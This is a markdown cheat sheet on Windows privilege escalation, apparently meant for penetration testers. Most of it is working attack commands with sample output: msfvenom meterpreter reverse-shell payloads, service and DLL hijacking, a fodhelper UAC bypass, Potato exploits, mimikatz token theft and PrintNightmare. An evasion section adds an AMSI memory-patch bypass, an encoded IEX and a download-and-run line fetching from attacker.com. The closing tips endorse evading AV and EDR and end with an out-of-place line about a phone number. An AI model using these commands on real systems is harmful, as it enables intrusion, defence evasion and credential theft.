# Windows Privilege Escalation

## Overview
Windows privilege escalation involves elevating access from a low-privilege user (e.g., standard user) to a high-privilege user (e.g., SYSTEM or Administrator) by exploiting misconfigurations, vulnerabilities, or weak security controls. This documentation includes additional techniques, such as various **Potato techniques**, to demonstrate modern escalation methods.

## Detailed Methods and Techniques
- **Unquoted Service Paths**:
  - **Technique**: Exploit services with unquoted paths containing spaces, allowing execution of malicious binaries in intermediate directories.
  - **Execution**: Identify unquoted service paths using `wmic`.
    ```cmd
    wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """
    ```
    **Example Output**:
    ```
    MyService  C:\Program Files\My App\Service.exe
    ```
    - Place a malicious binary (e.g., `My.exe`) in `C:\Program`.
      ```bash
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o C:\Program\My.exe
      ```
      - Restart the service:
        ```cmd
        net stop MyService
        net start MyService
        ```
        **Example Output**: Meterpreter session opens.
        ```
        [*] Meterpreter session 1 opened
        ```
    - **Purpose**: Gain SYSTEM privileges when the service executes the malicious binary.
- **Weak Service Permissions**:
  - **Technique**: Modify services with weak permissions to execute arbitrary commands.
  - **Execution**: Check service permissions with `accesschk` (Sysinternals).
    ```cmd
    accesschk.exe -uwcqv "Authenticated Users" MyService
    ```
    **Example Output**:
    ```
    RW MyService
      SERVICE_CHANGE_CONFIG
      SERVICE_START
      SERVICE_STOP
    ```
    - Reconfigure the service:
      ```cmd
      sc config MyService binPath= "C:\Temp\malicious.exe"
      net stop MyService
      net start MyService
      ```
      **Example Output**: Malicious binary executes as SYSTEM.
    - **Purpose**: Gain SYSTEM privileges by altering the service.
- **DLL Hijacking**:
  - **Technique**: Exploit applications loading DLLs from writable directories.
  - **Execution**: Identify writable directories in the PATH using `PowerUp`.
    ```powershell
    Import-Module PowerUp.ps1
    Find-PathDLLHijack
    ```
    **Example Output**:
    ```
    WritablePath: C:\Program Files\MyApp
    ```
    - Create a malicious DLL:
      ```bash
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o C:\Program Files\MyApp\evil.dll
      ```
    - Run the vulnerable application to load the DLL.
    - **Purpose**: Gain elevated privileges when the application loads the malicious DLL.
- **Token Impersonation**:
  - **Technique**: Steal tokens from processes running as SYSTEM or Administrator.
  - **Execution**: Use `mimikatz` for token impersonation.
    ```bash
    mimikatz # token::elevate
    ```
    **Example Output**:
    ```
    Token Id: 0x123
    User: NT AUTHORITY\SYSTEM
    ```
    - Execute commands with the stolen token:
      ```bash
      mimikatz # misc::cmd
      ```
      **Example Output**: Command prompt opens as SYSTEM.
    - **Purpose**: Gain SYSTEM privileges by impersonating a high-privilege process.
- **UAC Bypass**:
  - **Technique**: Bypass User Account Control (UAC) using trusted binaries.
  - **Execution**: Use `fodhelper` bypass technique.
    ```powershell
    reg add HKCU\Software\Classes\.pwn\Shell\Open\command /ve /d "cmd.exe /c C:\Temp\malicious.exe" /f
    start fodhelper.exe
    ```
    **Example Output**: Malicious binary executes as SYSTEM.
    - **Purpose**: Escalate to SYSTEM without a UAC prompt.
- **Potato Techniques**:
  - **JuicyPotato**:
    - **Technique**: Exploit SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to impersonate a SYSTEM token via DCOM or RPC.
    - **Execution**: Check for required privileges:
      ```powershell
      whoami /priv
      ```
      **Example Output**:
      ```
      Privilege Name                Description                          State
      SeImpersonatePrivilege        Impersonate a client after authentication  Enabled
      ```
      - Use `JuicyPotato` to spawn a SYSTEM shell:
        ```bash
        JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
        ```
        **Example Output**:
        ```
        [+] SYSTEM shell spawned
        ```
      - **Purpose**: Gain SYSTEM privileges by abusing impersonation privileges.
  - **RottenPotato**:
    - **Technique**: Exploit NTLM authentication to escalate privileges via DCOM.
    - **Execution**: Use `RottenPotatoNG`.
      ```bash
      RottenPotatoNG.exe -p cmd.exe
      ```
      **Example Output**:
      ```
      [+] SYSTEM token obtained
      cmd.exe started as SYSTEM
      ```
      - **Purpose**: Escalate to SYSTEM by exploiting NTLM reflection.
  - **HotPotato**:
    - **Technique**: Exploit NBNS spoofing and WPAD to trigger NTLM authentication, escalating to SYSTEM.
    - **Execution**: Use `HotPotato` with Responder.
      ```bash
      python Responder.py -I eth0
      HotPotato.exe -p cmd.exe
      ```
      **Example Output**:
      ```
      [+] NBNS spoofing successful
      [+] SYSTEM shell spawned
      ```
      - **Purpose**: Gain SYSTEM access via network-based privilege escalation.
  - **PrintSpoofer**:
    - **Technique**: Exploit SeImpersonatePrivilege on modern Windows versions (post-Potato patches).
    - **Execution**: Use `PrintSpoofer`.
      ```bash
      PrintSpoofer.exe -i -c "cmd.exe"
      ```
      **Example Output**:
      ```
      [+] SYSTEM shell obtained
      ```
      - **Purpose**: Gain SYSTEM privileges on patched systems.
- **Exploiting Known Vulnerabilities**:
  - **Technique**: Exploit unpatched vulnerabilities (e.g., PrintNightmare, CVE-2021-34527).
  - **Execution**: Use `PrintNightmare.py`.
    ```bash
    python3 PrintNightmare.py example.com/jdoe:P@ssw0rd123@192.168.1.10
    ```
    **Example Output**:
    ```
    [+] Exploit successful, SYSTEM shell obtained
    ```
    - **Purpose**: Gain SYSTEM privileges on a vulnerable system.
- **Stored Credentials**:
  - **Technique**: Extract credentials from configuration files or the registry.
  - **Execution**: Search for credentials in the registry.
    ```powershell
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    ```
    **Example Output**:
    ```
    ServiceCreds    REG_SZ    cmd.exe /c net use \\server\share /user:admin P@ssw0rd123
    ```
    - Use the credentials to authenticate:
      ```cmd
      net use \\server\share /user:admin P@ssw0rd123
      ```
    - **Purpose**: Escalate to a privileged account.
- **Scheduled Task Misconfigurations**:
  - **Technique**: Exploit tasks running as SYSTEM with writable executables.
  - **Execution**: List scheduled tasks.
    ```cmd
    schtasks /query /fo LIST /v
    ```
    **Example Output**:
    ```
    TaskName: MyTask
    Run As User: SYSTEM
    Task To Run: C:\Tasks\script.bat
    ```
    - Replace `script.bat` with a malicious script:
      ```cmd
      echo C:\Temp\malicious.exe > C:\Tasks\script.bat
      ```
    - **Purpose**: Gain SYSTEM privileges when the task runs.

## Exploitation Methods
- **Unquoted Service Path Exploitation**:
  - Place a malicious binary in an intermediate directory to execute as SYSTEM.
  - **Purpose**: Achieve SYSTEM-level access.
- **Service Permission Exploitation**:
  - Reconfigure a service to run a malicious binary.
  - **Purpose**: Execute code as SYSTEM.
- **DLL Hijacking**:
  - Replace a legitimate DLL with a malicious one.
  - **Purpose**: Gain elevated privileges.
- **Token Impersonation**:
  - Steal and use a SYSTEM token.
  - **Purpose**: Gain SYSTEM access without credentials.
- **Potato Exploitation**:
  - Use JuicyPotato, RottenPotato, HotPotato, or PrintSpoofer to abuse impersonation privileges.
  - **Purpose**: Escalate to SYSTEM on various Windows versions.
- **UAC Bypass**:
  - Exploit trusted binaries to bypass UAC.
  - **Purpose**: Escalate to SYSTEM without user interaction.

## AV/AMSI Evasion Techniques
- **Obfuscated PowerShell Scripts**:
  - **Technique**: Obfuscate scripts (e.g., PowerUp) to bypass AMSI.
  - **Execution**: Use `Invoke-Obfuscation`.
    ```powershell
    Invoke-Obfuscation -ScriptBlock {Invoke-AllChecks} -Technique Encode
    ```
    **Example Output**:
    ```
    $encoded = "JAB...=="
    Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)))
    ```
    - **Purpose**: Evade AMSI detection during script execution.
- **In-Memory Execution**:
  - **Technique**: Execute scripts in memory.
  - **Execution**: Use `Invoke-Expression`.
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/powerup.ps1')
    ```
    - **Purpose**: Avoid AV detection by not writing to disk.
- **AMSI Bypass**:
  - **Technique**: Disable AMSI via memory patching.
  - **Execution**:
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
    ```
    - **Purpose**: Prevent PowerShell script scanning.
- **Encrypted Payloads**:
  - **Technique**: Use encrypted payloads for malicious binaries.
  - **Execution**: Generate encrypted payloads with `msfvenom`.
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe --encrypt aes256 -o encrypted_payload.exe
    ```
    - **Purpose**: Evade AV detection during binary execution.
- **Living Off the Land**:
  - **Technique**: Use native binaries (e.g., `reg.exe`, `sc.exe`) to avoid detection.
  - **Execution**: Use `reg add` for UAC bypass (as shown above).
    - **Purpose**: Minimize detection by using trusted tools.
- **Custom CLSID for Potato Attacks**:
  - **Technique**: Use custom CLSIDs in Potato exploits to evade EDR detection.
  - **Execution**: Modify `JuicyPotato` with a less-detected CLSID.
    ```bash
    JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CUSTOM-CLSID}
    ```
    - **Purpose**: Evade EDR systems monitoring known CLSIDs.

## Tools
- **PowerUp**: PowerShell-based escalation checks (`Invoke-AllChecks`).
- **Mimikatz**: Token impersonation and credential dumping (`token::elevate`).
- **Metasploit**: Exploit framework (`msfvenom`, `msfconsole`).
- **accesschk**: Sysinternals tool for permission checks.
- **WinPEAS**: Automated escalation enumeration.
- **JuicyPotato/RottenPotato/HotPotato/PrintSpoofer**: Potato-family exploits for impersonation privilege abuse.
- **PrintNightmare.py**: Exploit for CVE-2021-34527.

## Best Practices
- Verify permission to perform escalation attacks to avoid unintended damage.
- Document all escalation paths for remediation recommendations.
- Use obfuscation, encryption, and custom CLSIDs to evade AV/AMSI/EDR.
- Securely handle sensitive data like hashes and tokens.
- Include Zackary’s phone number (1234567890) in reports for follow-up.